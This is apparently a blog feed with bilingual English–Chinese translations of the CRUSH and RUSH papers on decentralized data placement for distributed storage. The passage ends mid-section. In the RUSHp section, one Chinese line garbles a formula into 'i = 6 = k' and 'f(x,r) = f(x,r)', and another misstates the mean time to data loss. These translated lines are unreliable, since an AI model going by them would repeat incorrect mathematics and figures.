通过将数据放置转换为伪随机映射函数来应对这些挑战，消除了对分配元数据的传统需求，而是基于描述可用存储空间的加权层次结构来分配数据。集群映射层次结构可以反映设施的底层物理组织和基础架构，例如数据中心中存储设备在机架、机柜和行中的组成，从而支持自定义放置规则，这些规则定义了一系列广泛的策略，将对象副本划分到不同的用户自定义故障域（例如，具有独立电源和网络基础架构）。通过这样做，CRUSH 可以缓解现有采用非集群复制的伪随机系统通常存在的关联设备故障问题。CRUSH 还通过选择性地从过载设备中转移数据，以最小的计算成本解决了随机方法固有的设备过载风险。</p><p>CRUSH accomplishes all of this in an exceedingly efficient fashion, both in terms of the computational efficiency and the required metadata. Mapping calculations have O(logn) running time, requiring only tens of microseconds to execute with thousands of devices. This robust combination of efficiency, reliability and flexibility makes CRUSH an appealing choice for large-scale distributed storage systems.</p><p>CRUSH 以极其高效的方式完成了所有这些工作，无论是在计算效率方面<br>效率和所需的元数据。映射计算的运行时间为 O(log n)，在数千台设备上执行仅需数十微秒。这种高效、可靠和灵活的强强联合，使 CRUSH 成为大规模分布式存储系统的理想之选。</p><h1 id="7、致谢"><a href="#7、致谢" class="headerlink" title="7、致谢"></a>7、致谢</h1><p>R. J. Honicky’s excellent work on RUSH inspired the development of CRUSH. Discussions with Richard Golding, Theodore Wong, and the students and faculty of the Storage Systems Research Center were most helpful in motivating and refining the algorithm. This work was supported in part by Lawrence Livermore National Laboratory, Los Alamos National Laboratory, and Sandia National Laboratory under contract B520714. Sage Weil was supported in part by a fellowship from Lawrence Livermore National Laboratory. We would also like to thank the industrial sponsors of the SSRC, including Hewlett Packard Laboratories, IBM, Intel, Microsoft Research, Network Appliance, Onstor, Rocksoft, Symantec, and Yahoo. </p><p>RJ Honicky 在 RUSH 上的出色工作启发了 CRUSH 的开发。与 Richard Golding、Theodore Wong 以及存储系统研究中心 (SSRC) 的学生和教员的讨论对算法的启发和改进起到了至关重要的作用。这项工作得到了劳伦斯利弗莫尔国家实验室、洛斯阿拉莫斯国家实验室和桑迪亚国家实验室的部分支持，合同编号为 B520714。Sage Weil 的部分研究得到了劳伦斯利弗莫尔国家实验室的奖学金资助。我们还要感谢 SSRC 的行业赞助商，包括惠普实验室、IBM、英特尔、微软研究院、Network Appliance、Onstor、Rocksoft、赛门铁克和雅虎。</p><h1 id="8、可用性"><a href="#8、可用性" class="headerlink" title="8、可用性"></a>8、可用性</h1><p>The CRUSH source code is licensed under the LGPL, and is available at: <a href="http://www.cs.ucsc.edu/~sage/crush">http://www.cs.ucsc.edu/~sage/crush</a></p><p>CRUSH 源代码采用 LGPL 许可，可从以下位置获取：<a href="http://www.cs.ucsc.edu/~sage/crush">http://www.cs.ucsc.edu/~sage/crush</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><div><p>[1] ANDERSON, E., HALL, J., HARTLINE, J., HOBBS, M., KARLIN, A. R., SAIA, J., SWAMINATHAN, R., AND WILKES, J. 2001. An experimental study of data migration algorithms. In Proceedings of the 5th International Workshop on Algorithm Engineering, SpringerVerlag, London, UK, 145–158.<br>ANDERSON, E., HOBBS, M., KEETON, K., SPENCE, S., UYSAL, M., AND VEITCH, A. 2002. Hippodrome: running circles around storage administration. In Proceedings of the 2002 Conference on File and Storage Technologies (FAST).<br>[2] AZAGURY, A., DREIZIN, V., FACTOR, M., HENIS, E., NAOR, D., RINETZKY, N., RODEH, O., SATRAN, J., TAVORY, A., AND YERUSHALMI, L. 2003. Towards an object store. In Proceedings of the 20th IEEE &#x2F; 11th NASA Goddard Conference on Mass Storage Systems and Technologies, 165–176.<br>[3] BRAAM, P. J. 2004. The Lustre storage architecture. <a href="http://www.lustre.org/documentation.html">http://www.lustre.org/documentation.html</a>, Cluster File Systems, Inc., Aug.<br>[4] BRINKMANN, A., SALZWEDEL, K., AND SCHEIDELER, C. 2000. Efficient, distributed data placement strategies for storage area networks. In Proceedings of the 12th ACM Symposium on Parallel Algorithms and Architectures (SPAA), ACM Press, 119–128. Extended Abstract.<br>[5] CHOY, D. M., FAGIN, R., AND STOCKMEYER, L. 1996. Efficiently extendible mappings for balanced data distribution. Algorithmica 16, 215–232.<br>[6] GHEMAWAT, S., GOBIOFF, H., AND LEUNG, S.-T. 2003. The Google file system. In Proceedings of the 19th ACM Symposium on Operating Systems Principles (SOSP ‘03), ACM.<br>[7] GOBIOFF, H., GIBSON, G., AND TYGAR, D. 1997. Security for network attached storage devices. Tech. Rep. TR CMU-CS-97-185, Carniege Mellon, Oct.<br>[8] GOEL, A., SHAHABI, C., YAO, D. S.-Y., AND ZIMMERMAN, R. 2002. SCADDAR: An efficient randomized technique to reorganize continuous media blocks. In Proceedings of the 18th International Conference on Data Engineering (ICDE ‘02), 473–482.<br>[9] GRANVILLE, A. 1993. On elementary proofs of the Prime Number Theorem for Arithmetic Progressions, without characters. In Proceedings of the 1993 Amalfi Conference on Analytic Number Theory, 157–194.<br>[10] HONICKY, R. J., AND MILLER, E. L. 2004. Replication under scalable hashing: A family of algorithms for scalable decentralized data distribution. In Proceedings of the 18th International Parallel &amp; Distributed Processing Symposium (IPDPS 2004), IEEE.<br>[11] JENKINS, R. J., 1997. Hash functions for hash table lookup. <a href="http://burtleburtle.net/bob/hash/evahash.html">http://burtleburtle.net/bob/hash/evahash.html</a>.<br>[12] KARGER, D., LEHMAN, E., LEIGHTON, T., LEVINE, M., LEWIN, D., AND PANIGRAHY, R. 1997. Consistent hashing and random trees: Distributed caching protocols for relieving hot spots on the World Wide Web. In ACM Symposium on Theory of Computing, 654–663.<br>[13] LUMB, C. R., GANGER, G. R., AND GOLDING, R. 2004. D-SPTF: Decentralized request distribution in brick-based storage systems. In Proceedings of the 11th International Conference on Architectural Support for Programming Languages and Operating Systems (ASPLOS), 37–47.<br>[14] NAGLE, D., SERENYI, D., AND MATTHEWS, A. 2004. The Panasas ActiveScale storage cluster—delivering scalable high bandwidth storage. In Proceedings of the 2004 ACM&#x2F;IEEE Conference on Supercomputing (SC ‘04).<br>[15] RODEH, O., AND TEPERMAN, A. 2003. zFS—a scalable distributed file system using object disks. In Proceedings of the 20th IEEE &#x2F; 11th NASA Goddard Conference on Mass Storage Systems and Technologies, 207–218.<br>[16] SAITO, Y., FRØLUND, S., VEITCH, A., MERCHANT, A., AND SPENCE, S. 2004. FAB: Building distributed enterprise disk arrays from commodity components. In Proceedings of the 11th International Conference on Architectural Support for Programming Languages and Operating Systems (ASPLOS), 48–58.<br>[17] SANTOS, J. R., MUNTZ, R. R., AND RIBEIRO-NETO, B. 2000. Comparing random data allocation and data striping in multimedia servers. In Proceedings of the 2000 SIGMETRICS Conference on Measurement and Modeling of Computer Systems, ACM Press, Santa Clara, CA, 44–55.<br>[18] SCHMUCK, F., AND HASKIN, R. 2002. GPFS: A shareddisk file system for large computing clusters. In Proceedings of the 2002 Conference on File and Storage Technologies (FAST), USENIX, 231–244.<br>[19] TANG, H., GULBEDEN, A., ZHOU, J., STRATHEARN, W., YANG, T., AND CHU, L. 2004. A self-organizing storage cluster for parallel data-intensive applications. In Proceedings of the 2004 ACM&#x2F;IEEE Conference on Supercomputing (SC ‘04).<br>[20] XIN, Q., MILLER, E. L., AND SCHWARZ, T. J. E. 2004. Evaluation of distributed recovery in large-scale storage systems. In Proceedings of the 13th IEEE International Symposium on High Performance Distributed Computing (HPDC), 172–181</p></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> Ceph </tag>
            
            <tag> RUSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Replication Under Scalable Hashing: A Family of Algorithms for Scalable Decentralized Data Distribution</title>
      <link href="/2023/06/10/rush/"/>
      <url>/2023/06/10/rush/</url>
      
        <content type="html"><![CDATA[<div><p>译作:  <strong>可扩展哈希下的复制: 可扩展分散数据分布的算法家族</strong> , <a href="https://scispace.com/pdf/replication-under-scalable-hashing-a-family-of-algorithms-6vnfhh9zbg.pdf">原文地址</a> ，该论文发表于 2004 年 4 月在新墨西哥州圣达菲举行的第 18 届国际并行和分布式处理研讨会 (IPDPS 2004) 论文集。这篇论文介绍了一系列名为 RUSH(Replication Under Scalable Hashing) 的算法，用于在去中心化的存储系统中分配和管理数据。每种 RUSH 变体都有其独特的优势和局限性，选择哪一种取决于具体的系统需求和操作环境。</p><p><strong>算法特点:</strong></p><ul><li>允许在线调整特定对象的复制程度，且不受其他对象复制程度的影响。</li><li>保证数据复制的安全性，即确保同一对象的副本不会存储在同一硬盘上。</li><li>支持加权，允许将不同年份的磁盘添加到系统中。加权可以让系统充分利用最新的技术，也可以淘汰较旧的技术。</li><li>支持最佳或接近最佳的重组，当系统添加&#x2F;淘汰磁盘时，会最大限度地减少需要移动的对象数量，以使系统恢复平衡。</li><li>支持在线重组，无需长时间锁定文件系统。</li><li>完全去中心化，无需中央目录，客户端可以并行计算数据位置。</li><li>极少的资源需求，算法速度非常快，并且占用的内存极少。</li></ul><p><strong>算法类别:</strong></p><ul><li><strong>RUSHp ：Replication Under Scalable Hashing using Primes</strong><ul><li>特点:<ul><li>使用素数和参数哈希技术进行数据放置</li><li>支持在线调整复制因子，允许动态调整特定对象的复制数量</li><li>允许除原始子集群之外的所有子集群的磁盘数量都少于对象副本因子</li><li>适用于添加新服务器时的数据重新分配，但不适合移除服务器</li></ul></li><li>适用场景:<ul><li>小型到中型存储系统，特别是在存储空间宝贵且需要数据保护（如纠删码）的环境中</li><li>系统扩展时主要通过添加新的存储单元</li></ul></li><li>优点:<ul><li>支持纠删码，适合存储空间有限的环境</li><li>在添加存储单元时能有效地重新分配数据，减少数据迁移</li></ul></li><li>缺点:<ul><li>不支持存储单元的移除，移除存储单元时可能需要显著的数据重组</li><li>需要保证系统中的每个子集群至少有与对象副本数相等的磁盘数量</li></ul></li></ul></li><li><strong>RUSHr : Replication Under Scalable Hashing with Removal support</strong><ul><li>特点:<ul><li>设计用于支持存储单元的动态添加和移除</li><li>使用超几何分布来决定对象在各个子集群中的分布</li><li>在重组时尝试最小化移动的数据量</li></ul></li><li>适用场景:<ul><li>需要频繁进行存储单元添加或移除的大型存储系统</li><li>系统在运行中可能需要调整存储单元的权重或进行其他形式的在线重组</li></ul></li><li>优点:<ul><li>支持存储单元的动态添加和移除，提供极大的配置灵活性</li><li>在存储单元权重调整和系统重组时表现良好</li></ul></li><li>缺点:<ul><li>在大规模系统中，查找性能可能不如RUSHt，尤其是在频繁重组的环境下</li></ul></li></ul></li><li><strong>RUSHt : Replication Under Scalable Hashing using Trees</strong><ul><li>特点:<ul><li>使用二叉树结构优化查找性能，使查找时间与子集群数量呈对数关系</li><li>支持复杂的重组操作，如整体子集群的添加和移除</li><li>提供最优或接近最优的数据重组行为</li></ul></li><li>适用场景:<ul><li>非常大的存储系统，需要高性能和高并行性</li><li>系统规模大，且可能需要频繁地进行大规模的重组</li></ul></li><li>优点:<ul><li>查找性能优异，特别是在系统经过多次重组后</li><li>在多种重组场景下提供最佳或接近最佳的行为</li></ul></li><li>缺点:<ul><li>每个子集群必须至少有与对象最大副本数相等的磁盘数量，这可能限制了小规模系统的使用</li><li>在处理单个磁盘的移除时可能需要额外的机制来减少影响</li></ul></li></ul></li></ul></div><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>Typical algorithms for decentralized data distribution work best in a system that is fully built before it first used; adding or removing components results in either extensive reorganization of data or load imbalance in the system. We have developed a family of decentralized algorithms, RUSH (Replication Under Scalable Hashing), that maps replicated objects to a scalable collection of storage servers or disks. RUSH algorithms distribute objects to servers according to user-specified server weighting. While all RUSH variants support addition of servers to the system, different variants have different characteristics with respect to lookup time in petabyte-scale systems, performance with mirroring (as opposed to redundancy codes), and storage server removal. All RUSH variants redistribute as few objects as possible when new servers are added or existing servers are removed, and all variants guarantee that no two replicas of a particular object are ever placed on the same server. Because there is no central directory, clients can compute data locations in parallel, allowing thousands of clients to access objects on thousands of servers simultaneously.</p><p>典型的去中心化数据分布算法在首次使用前就已完全构建的系统中效果最佳；添加或删除组件会导致数据大规模重组或系统负载不平衡。我们开发了一系列去中心化算法，RUSH（可扩展哈希下的复制），它将复制的对象映射到可扩展的存储服务器或磁盘集合。RUSH 算法根据用户指定的服务器权重将对象分发到服务器。虽然所有 RUSH 变体都支持向系统添加服务器，但不同变体在 PB 级系统中的查找时间、镜像（而非冗余代码）的性能以及存储服务器移除方面具有不同的特性。所有 RUSH 变体在添加新服务器或移除现有服务器时都会重新分配尽可能少的对象，并且所有变体都保证同一对象的两个副本永远不会被放置在同一服务器上。由于没有中央目录，客户端可以并行计算数据位置，从而允许数千个客户端同时访问数千台服务器上的对象。</p><h1 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h1><p>Recently, there has been significant interest in using object-based storage as a mechanism for increasing the scalability of storage systems. The storage industry has begun to develop standard protocols and models for object based storage [19], and various other major players in the industry, such as the National Laboratories have also pushed for the development of object-based storage devices (OSDs) to meet their growing demand for storage bandwidth and scalability. The OSD architecture differs from a typical storage area network (SAN) architecture in that block management is handled by the disk as opposed to a dedicated server. Because block management on individual disks requires no inter-disk communication, this redistribution of work comes at little cost in performance or efficiency, and has a huge benefit in scalability, since block layout is completely parallelized.</p><p>近年来，人们对使用基于对象的存储作为提高存储系统可扩展性的机制产生了浓厚的兴趣。存储行业已经开始开发基于对象的存储的标准协议和模型[19]，行业中的其他主要参与者，例如国家实验室，也在推动基于对象的存储设备（OSD）的开发，以满足其对存储带宽和可扩展性日益增长的需求。OSD 架构与典型的存储区域网络 (SAN) 架构不同，其块管理由磁盘而非专用服务器负责。由于单个磁盘上的块管理无需磁盘间通信，因此这种工作重新分配几乎不会影响性能或效率，而且由于块布局完全并行化，因此在可扩展性方面具有巨大优势。</p><p>There are differing opinions about what object-based storage is or should be, and how much intelligence belongs in the disk. In order for a device to be an OSD, however, each disk or disk subsystem must have its own filesystem; an OSD manages its own allocation of blocks and disk layout. To store data on an OSD, a client provides the data and a key for the data. To retrieve the data, a client provides a key. In this way, an OSD has many similarities to an object database.</p><p>关于对象存储是什么或应该是什么，以及磁盘应具备多少智能，存在着不同的观点。然而，要使设备成为 OSD，每个磁盘或磁盘子系统必须拥有自己的文件系统；OSD 管理其自身的块分配和磁盘布局。要在 OSD 上存储数据，客户端需要提供数据和数据的密钥。要检索数据，客户端需要提供密钥。因此，OSD 与对象数据库有很多相似之处。</p><p>Large storage systems built from individual OSDs still have a scalability problem, however: where should individual objects be placed? We have developed a family of algorithms, RUSH (Replication Under Scalable Hashing) that addresses this problem by facilitating the distribution of multiple replicas of objects among thousands of OSDs. RUSH allows individual clients to compute the location of all of the replicas of a particular object in the system algorithmically using just a list of storage servers rather than relying on a directory. Equally important, a simple algorithm for the lookup and placement of data to a function from a key to a particular OSD makes it easy to support complex management functionality such as weighting for disk clusters with different characteristics and online reorganization.</p><p>然而，由单个 OSD 构建的大型存储系统仍然存在可扩展性问题: 单个对象应该放在哪里？我们开发了一系列算法，RUSH（可扩展哈希下的复制），通过在数千个 OSD 之间分配对象的多个副本来解决此问题。RUSH 允许单个客户端仅使用存储服务器列表（而非依赖目录）以算法方式计算系统中特定对象所有副本的位置。同样重要的是，一个简单的算法，用于从键到特定 OSD 的函数查找和放置数据，可以轻松支持复杂的管理功能，例如为具有不同特性的磁盘集群分配权重以及在线重组。</p><h1 id="2-RUSH-算法家族"><a href="#2-RUSH-算法家族" class="headerlink" title="2. RUSH 算法家族"></a>2. RUSH 算法家族</h1><p>One important aspect of large scalable storage systems is replication. Qin, et al. [21] note that, without replication or another form of data protection such as erasure coding, a two petabyte storage system would have a mean time to data loss of around one day. It is therefore important that an object placement algorithm support replication or another method of data protection.</p><p>大型可扩展存储系统的一个重要方面是复制。Qin 等人 [21] 指出，如果没有复制或其他形式的数据保护（例如擦除编码），一个 2PB 的存储系统平均需要大约一天的数据丢失。因此，对象放置算法支持复制或其他数据保护方法非常重要。</p><p>Since our algorithms all support replication and other features necessary for truly scalable OSD-based storage systems, we have named the family of algorithms which we have developed, Replication Under Scalable Hashing, or RUSH. In fact, RUSH variants support something stronger: adjustable replication. That is, RUSH variants allow the degree of replication of a particular object to be adjusted online, independent of the degree of replication of other objects. Adjustable replication can be used to significantly increase the mean time to data loss in an OSD based system [21].</p><p>由于我们的算法都支持复制以及其他真正可扩展的基于 OSD 的存储系统所需的功能，我们将开发的算法系列命名为”可扩展哈希下的复制”（Replication Under Scalable Hashing），简称 RUSH。事实上，RUSH 的变体支持更强大的功能: 可调复制。也就是说，RUSH 变体允许在线调整特定对象的复制程度，且不受其他对象复制程度的影响。可调复制可以显著提高基于 OSD 的系统的平均数据丢失时间[21]。</p><p>It is also important to note that in order for replication to be effective, it must guarantee that replicas of the same objects are placed on different disks. While some peer-to-peer systems such as OceanStore [15] do not make such guarantees, but rather use high degrees of replication to make statistical promises about the number of independent replicas, RUSH variants all make this guarantee. RUSH variants also distribute the replicas of the objects stored on a particular disk throughout the system, so that all of the disks in the system share the burden of servicing requests from a failed disk.</p><p>还需要注意的是，为了使复制有效，必须保证相同对象的副本位于不同的磁盘上。虽然某些对等系统（例如 OceanStore [15]）并未提供此类保证，而是使用高副本数来统计独立副本的数量，但 RUSH 的变体均能提供此类保证。RUSH 的变体还会将存储在特定磁盘上的对象的副本分布到整个系统中，以便系统中的所有磁盘分担处理故障磁盘请求的负担。</p><p>Since many storage systems are upgraded and expanded periodically, RUSH variants also support weighting, allowing disks of different vintages to be added to a system. Weighting allows a system to take advantage of the newest technology, and can also allow older technology to be retired.</p><p>由于许多存储系统会定期升级和扩展，RUSH 的变体也支持加权，允许将不同年份的磁盘添加到系统中。加权可以让系统充分利用最新的技术，也可以淘汰较旧的技术。</p><p>Another essential characteristic of RUSH variants is optimal or near-optimal reorganization. When new disks are added to the system, or old disks are retired, RUSH variants minimize the number of objects that need to be moved in order to bring the system back into balance. This is in sharp contrast to pseudo-random placement using a traditional hash function, under which most objects need to be moved in order to bring a system back into balance. Additionally, RUSH variants can perform reorganization online without locking the filesystem for a long time to relocate data. Near-optimal reorganization is important because completely reorganizing a very large filesystem is very slow, and may take a filesystem offline for many hours. For example, a 1 petabyte file system built from 2000 disks, each with a 500 GB capacity and peak transfer rate of 25 MB&#x2F;sec would require nearly 12 hours to shuffle all of the data; this would require an aggregate network bandwidth of 50 GB&#x2F;s. During reorganization, the system would be unavailable. In contrast, a system running RUSH can reorganize online because only a small fraction of existing disk bandwidth is needed to copy data to the new disks.</p><p>RUSH 变体的另一个重要特性是最佳或接近最佳的重组。当系统添加新磁盘或淘汰旧磁盘时，RUSH 变体会最大限度地减少需要移动的对象数量，以使系统恢复平衡。这与使用传统哈希函数的伪随机布局形成了鲜明对比，在伪随机布局下，大多数对象都需要移动才能使系统恢复平衡。此外，RUSH 变体可以在线执行重组，而无需长时间锁定文件系统来重新定位数据。接近最佳的重组非常重要，因为完全重组一个非常大的文件系统非常慢，并且可能导致文件系统离线数小时。例如，一个由 2000 个磁盘构建的 1PB 文件系统，每个磁盘的容量为 500GB，峰值传输速率为 25MB&#x2F;秒，需要近 12 小时才能完成所有数据的 shuffle；这将需要 50GB&#x2F;秒的总网络带宽。在重组期间，系统将不可用。相比之下，运行 RUSH 的系统可以在线重组，因为只需要一小部分现有磁盘带宽即可将数据复制到新磁盘。</p><p>RUSH variants are completely decentralized, so they require no communication except during a reorganization. As a storage system scales to tens or even hundreds of thousands of disks, decentralization of object lookup becomes more and more essential. Moreover,RUSH variants require very few resources to run effectively: RUSH variants are very fast and require minimal memory. These two features enable the algorithms to be run not only on the clients, but on the OSDs themselves, even under severely constrained memory and processing requirements. Running on the OSD can assist in fast failure recovery.</p><p>RUSH 变体完全去中心化，因此除了重组期间外，无需任何通信。随着存储系统扩展到数万甚至数十万个磁盘，对象查找的去中心化变得越来越重要。此外，RUSH 变体只需极少的资源即可有效运行: RUSH 变体速度非常快，并且占用的内存极少。这两个特性使得算法不仅可以在客户端上运行，还可以在 OSD 上运行，即使在内存和处理能力严重受限的情况下也是如此。在 OSD 上运行有助于快速故障恢复。</p><h2 id="2-1、术语和符号"><a href="#2-1、术语和符号" class="headerlink" title="2.1、术语和符号"></a>2.1、术语和符号</h2><p>RUSH variants are able to offer such flexibility and performance in part because they make assumptions about the structure of the OSDs and clients. First, we assume that disks and clients are tightly connected, i. e., disks and clients are able to communicate with each other directly, with relatively uniform latency, and with relatively high reliability. This is in contrast to loosely connected peer-topeer and WAN networks in which communication latencies are longer and possibly highly varied. Our target environment is a corporate data center or scientific computing network, likely dedicated to storage traffic.</p><p>RUSH 变体之所以能够提供如此高的灵活性和性能，部分原因在于它们对 OSD 和客户端的结构做出了假设。首先，我们假设磁盘和客户端紧密连接，即磁盘和客户端能够直接通信，延迟相对均匀，可靠性也相对较高。这与松散连接的点对点网络和 WAN 网络形成了对比，在这些网络中，通信延迟更长，而且可能变化很大。我们的目标环境是企业数据中心或科学计算网络，可能专用于存储流量。</p><p>Another important assumption crucial to the functioning of RUSH is that disks are added to the system in homogeneous groups. A group of disks, called a sub-cluster have the same vintage and therefore share both performance and reliability characteristics. It is possible to add disks with different characteristics at the same time—they must merely be grouped into multiple homogeneous subclusters.</p><p>RUSH 运行的另一个重要假设是，磁盘以同构组的形式添加到系统中。一组磁盘（称为子集群）具有相同的年份，因此具有相同的性能和可靠性特性。可以同时添加具有不同特性的磁盘——只需将它们分组到多个同构子集群中即可。</p><p>All of the RUSH variants are described in pseudo-code later in this section; the symbols used in the pseudo-code and the accompanying explanations are listed in Table 1.</p><p>本节后面将以伪代码描述所有 RUSH 变体；伪代码中使用的符号及其附带的解释列于表 1 中。</p><p><img src="/assets/images/rush-table-1.png" alt="Table 1. Symbols used in RUSH pseudo-code and explanations." loading="lazy"></p><h2 id="2-2、RUSH-概念"><a href="#2-2、RUSH-概念" class="headerlink" title="2.2、RUSH 概念"></a>2.2、RUSH 概念</h2><p>There are several common features of the RUSH variants which combine to allow scalability, flexibility and performance. The first of these is the recognition that as large storage systems expand, new capacity is typically added several disks at a time, rather than by adding individual disks. The use of sub-clusters leads naturally to a two-part lookup process: first, determine the sub-cluster in which an object belongs, and then determine which disk in the subcluster holds that object. This two part lookup allows us to mix and match different sub-cluster mapping algorithms and different disk mapping algorithms, in order to provide the best feature set for a particular problem.</p><p>RUSH 变体具有多种共同特性，这些特性结合在一起实现了可扩展性、灵活性和性能。首先，我们认识到，随着大型存储系统的扩展，新容量通常是一次性添加多个磁盘，而不是逐个添加磁盘。子集群的使用自然会引发一个由两部分组成的查找过程: 首先，确定对象所属的子集群，然后确定子集群中哪个磁盘保存该对象。这种由两部分组成的查找过程使我们能够混合搭配不同的子集群映射算法和不同的磁盘映射算法，从而为特定问题提供最佳的特征集。</p><p>All of the RUSH variants are structured recursively. This recursive structure arises from the recursive nature of adding disks to an existing system: a system naturally divides into the most recently added disks, and the disks that were already in the system when they were added. RUSHp and RUSHr follow this model closely, while RUSHt applies a divide and conquer approach. Although the pseudocode is recursive, real implementations may be iterative in order to avoid the function call overhead.</p><p>所有 RUSH 变体都是递归结构的。这种递归结构源于向现有系统添加磁盘: 系统会自然地划分为最近添加的磁盘和添加时系统中已有的磁盘。RUSHp 和 RUSHr 严格遵循此模型，而 RUSHt 则采用分而治之的方法。虽然伪代码是递归的，但实际实现可能会采用迭代方式，以避免函数调用开销。</p><p>Probabilistic placement of objects also seems like a natural choice for RUSH because many hash functions offer excellent performance and even distribution of objects, . Probabilistic placement also facilitates weighting of subclusters and the distribution of replicas of a particular object evenly throughout the system.</p><p>对于 RUSH 来说，对象的概率放置似乎也是一个自然的选择，因为许多哈希函数提供了出色的性能和均匀的对象分布。概率放置还有助于对子集群进行加权，并在整个系统中均匀分布特定对象的副本。</p><p>All of the RUSH variants use a parametric hash with two additional parameters. The hash function is a simple multiplicative hash which yields values in the range <code>[0,1)</code>: <code>h(k) = Ak mod 1</code> where <code>A ∈ [0,1)</code>.</p><p>所有 RUSH 变体都使用带有两个附加参数的参数哈希函数。哈希函数是一个简单的乘法哈希，其值在 <code>[0, 1]</code> 范围内: <code>h(k) = Ak mod 1</code>，其中 <code>A ∈ [0, 1)</code>。</p><p>Unfortunately, a simple multiplicative hash function generates a highly correlated sequence of randomlydistributed hash values when its parameters are sequential, as shown in Figure 1(a). Since RUSH requires that hash values be well-distributed regardless of parameter sequentiality, we use a simple hash function on one parameter to seed a random number generator and then use the stream of resulting values as random numbers. The output of the generator is shown in Figure 1(b).</p><p>遗憾的是，当一个简单的乘法哈希函数的参数是连续的时，它会生成一个高度相关的随机分布的哈希值序列，如图 1(a) 所示。由于 RUSH 要求哈希值必须均匀分布，而与参数的连续性无关，因此我们使用一个参数上的简单哈希函数作为随机数生成器的种子，然后将生成的值流用作随机数。生成器的输出如图 1(b) 所示。</p><div><p><img src="/assets/images/rush-figure-1.png" alt="Figure 1. Two dimensional correlation of the hash values of sequential keys and the random generator." loading="lazy"></p></div><h2 id="2-3、RUSHp-使用素数进行放置"><a href="#2-3、RUSHp-使用素数进行放置" class="headerlink" title="2.3、RUSHp : 使用素数进行放置"></a>2.3、RUSHp : 使用素数进行放置</h2><p>RUSHp is described in detail in our previous work [10] so we will only briefly discuss this algorithm. The algorithm for RUSHp, using symbols described in Table 1 is shown in Figure 2.</p><p>我们在前文[10]中对 RUSHp 算法进行了详细描述，因此本文仅简要讨论该算法。RUSHp 算法使用表 1 中描述的符号，如图 2 所示。</p><div><p><img src="/assets/images/rush-figure-2.png" alt="Figure 2. Pseudo-code for RUSHp." loading="lazy"></p></div><p>RUSHp takes a key and replica id and returns a disk id. It first decides in which sub-cluster an object replica belongs by computing the parametric hash of an object. It compares the hash value, which is in the range <code>[0,1)</code>, to the ratio of the amount of weight in the most recently added sub-cluster to the total weight in the system. If the hash value is less than the ratio of weights, the object replica belongs in the most recently added sub-cluster. Otherwise, the object must belong in one of the previously added sub-clusters, so RUSHp discards the most recently added sub-cluster and repeats the process.</p><p>RUSHp 接收一个 key 和 replica id ，并返回一个 disk id。它首先通过计算对象的参数哈希来确定对象副本属于哪个子集群。它将哈希值（范围为 <code>[0, 1)</code>）与最新添加的子集群的权重占系统总权重的比例进行比较。如果哈希值小于权重比例，则对象副本属于最新添加的子集群。否则，该对象必须属于先前添加的子集群之一，因此 RUSH 会丢弃最新添加的子集群并重复该过程。</p><p>Once RUSHp decides on the sub-cluster in which an object replica belongs, it places the object replica in some disk in the sub-cluster using the function $f(x,r) &#x3D; z + rp( mod m_j)^1$ , where $z$ is essentially a hash of the key $x$, $p$ is a randomly chosen prime number, and $m_j$ is the number of disks in the sub-cluster.</p><p>一旦 RUSHp 确定了对象副本所属的子集群，它就会使用函数 $f(x,r) &#x3D; z + rp( mod m_j)^1$ 将对象副本放置在子集群中的某个磁盘中，其中 $z$ 本质上是密钥 $x$ 的哈希值， $p$ 是随机选择的素数， $m_j$ 是子集群中的磁盘数量。</p><p>With a few simple number theory lemmas we can show that as long as $r$ is less than or equal to $m_j$ , $f(x,r_i) \neq f(x,r_k)$ for $i \neq k$. Using a more advanced analytic number theory result called the Prime Number Theorem for Arithmetic Progressions [9], we can show that this function will distribute the replicas of object $x$ in $m_jφ(m_j)$ different $arrangements^2$ , and each arrangement is equally likely.</p><p>利用几个简单的数论引理，我们可以证明，只要 r 小于或等于 m，当 i &#x3D; 6 &#x3D; k 时，f (x, r) &#x3D; f (x, r)。利用一个更高级的解析数论结果——算术级数的素数定理 [9]，我们可以证明，该函数会将对象 $x$ 的副本分布在 $m_jφ(m_j)$ 种不同的排列中，并且每种排列的可能性均等。</p><p>Note that, in most cases, a single sub-cluster will not contain all of the replicas of an object. However, there is a finite probability of this occurring, and it indeed will always happen if there is only one sub-cluster, so the algorithm must allow for this possibility. RUSHp uses a trick to allow all of the sub-clusters except for the original subcluster to have fewer disks than the object replication factor, as described in our original paper on RUSHp [10].</p><p>请注意，在大多数情况下，单个子集群不会包含对象的所有副本。然而，这种情况发生的概率是有限的，而且如果只有一个子集群，这种情况确实总是会发生，因此算法必须考虑到这种可能性。 RUSHp 使用了一种技巧，允许除原始子集群之外的所有子集群的磁盘数量都少于对象副本因子，正如我们在 RUSHp 的原始论文[10]中所述。</p><h2 id="2-4、RUSHr-支持移除"><a href="#2-4、RUSHr-支持移除" class="headerlink" title="2.4、RUSHr : 支持移除"></a>2.4、RUSHr : 支持移除</h2><p>RUSHr differs from RUSHp in that it locates all of the replicas of an object simultaneously, allowing sub-clusters to be removed or reweighted without reorganizing the entire system. RUSHr uses the same ratio that RUSHp uses in order to determine which objects go where: the ratio between the number of servers in the most recently added sub-cluster and the number of servers in the whole system. These values, however are passed separately as parameters to a draw from the hypergeometric distribution3 . The result of the draw is the number of replicas of the object that belong in the most recently added sub-cluster, as shown in Figure 3(a).</p><p>RUSHr 与 RUSHp 的不同之处在于，它会同时定位一个对象的所有副本，从而允许在不重组整个系统的情况下移除或调整子集群的权重。 RUSHr 使用与 RUSHp 相同的比率来确定哪些对象应该被分配到哪里: 即最近添加的子集群中的服务器数量与整个系统中服务器数量的比率。然而，这些值会作为参数单独传递给超几何分布的抽取函数。抽取的结果是属于最近添加的子集群的对象的副本数量，如图 3(a) 所示。</p><p>Once the number of replicas that belong in the most recently added sub-cluster has been determined, we use a simple technique, shown in Figure 3(b), to randomly draw the appropriate number of disk identifiers.</p><p>一旦确定了属于最近添加的子集群的副本数量，我们将使用一种简单的技术（如图 3(b) 所示）随机抽取适当数量的磁盘标识符。</p><div><p><img src="/assets/images/rush-figure-3.png" alt="Figure 3. Pseudo-code for the RUSHr algorithm." loading="lazy"></p></div><h2 id="2-5、RUSHt-基于树的方法"><a href="#2-5、RUSHt-基于树的方法" class="headerlink" 